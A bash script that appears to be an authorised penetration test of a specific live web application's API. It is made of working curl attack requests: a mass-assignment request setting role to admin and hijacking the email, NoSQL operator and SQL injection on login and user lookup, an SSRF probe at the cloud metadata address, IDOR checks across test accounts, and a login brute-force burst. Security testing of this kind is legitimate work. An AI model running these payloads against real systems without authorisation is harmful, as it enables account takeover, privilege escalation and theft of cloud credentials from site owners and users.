#!/usr/bin/env bash
A="https://api.breezy.philippeluu.fr"; F="https://breezy.philippeluu.fr"; OUT=/tmp/riveta
TB=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$OUT/regB.json")
TC=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$OUT/regC.json")
BID="855b1cbc-5c37-4a43-aeef-5dda0e27965c"

echo "===== 1. profile-update route discovery (/users/me) ====="
for m in GET PUT PATCH POST DELETE; do
  echo -n "$m /users/me -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X $m "$A/users/me" -H "Authorization: Bearer $TB" -H "Content-Type: application/json" -d '{}'
done
echo "-- candidate update subpaths --"
for p in /users/me/profile /users/me/username /users/username /profile /me; do
  echo -n "PATCH $p -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X PATCH "$A$p" -H "Authorization: Bearer $TB" -H "Content-Type: application/json" -d '{}'
done

echo
echo "===== 2. mass-assignment on self profile update (PATCH /users/me) ====="
curl -sS -m 10 -w "\n[%{http_code}]\n" -X PATCH "$A/users/me" -H "Authorization: Bearer $TB" -H "Content-Type: application/json" \
  -d '{"role":"admin","is_active":true,"id":"00000000-0000-0000-0000-000000000009","email":"hijack@example.com","email_verified":true,"follower_count":99999}' | head -c 400
echo "-- re-read /users/me to see if anything stuck --"
curl -sS -m 10 "$A/users/me" -H "Authorization: Bearer $TB" | head -c 400; echo

echo
echo "===== 3. search endpoints + injection ====="
for q in '/users?search=a' '/users?q=a' '/users/search?q=a' '/posts?search=a' '/posts/search?q=a' '/search?q=a'; do
  echo -n "GET $q -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" "$A$q" -H "Authorization: Bearer $TB"
done
echo "-- NoSQL operator injection on login (Mongo-style) --"
curl -sS -m 8 -w " [%{http_code}]\n" -X POST "$A/auth/login" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 200
echo "-- SQLi-ish on by-username --"
curl -sS -m 8 -o /dev/null -w "%{http_code}\n" "$A/users/by-username/'%20OR%201=1--"

echo
echo "===== 4. /api/translate BFF (SSRF / abuse) ====="
echo -n "POST /api/translate {} -> "; curl -sS -m 10 -w " [%{http_code}]\n" -X POST "$F/api/translate" -H "Content-Type: application/json" -d '{}' | head -c 200
echo -n "with text+targetLang -> "; curl -sS -m 12 -w " [%{http_code}]\n" -X POST "$F/api/translate" -H "Content-Type: application/json" -d '{"text":"bonjour","targetLang":"en","target":"en"}' | head -c 300
echo -n "url/ssrf probe -> "; curl -sS -m 12 -w " [%{http_code}]\n" -X POST "$F/api/translate" -H "Content-Type: application/json" -d '{"text":"x","targetLang":"en","url":"http://169.254.169.254/latest/meta-data/"}' | head -c 200

echo
echo "===== 5. follow-request & notification IDOR ====="
echo -n "C reads B outgoing follow-reqs path -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" "$A/users/me/follow-requests/outgoing" -H "Authorization: Bearer $TC"
echo -n "C POST /notifications/read (no body) -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X POST "$A/notifications/read" -H "Authorization: Bearer $TC" -H "Content-Type: application/json" -d '{}'

echo
echo "===== 6. login rate-limiting (bounded burst: 15 failed attempts, account B) ====="
codes=""
for i in $(seq 1 15); do
  c=$(curl -sS -m 8 -o /dev/null -w "%{http_code}" -X POST "$A/auth/login" -H "Content-Type: application/json" -d '{"email":"riveta-pentest-b@example.com","password":"wrong-'$i'"}')
  codes="$codes $c"
done
echo "status sequence:$codes"
echo "(if all 400/401 and never 429 => no rate limiting)"
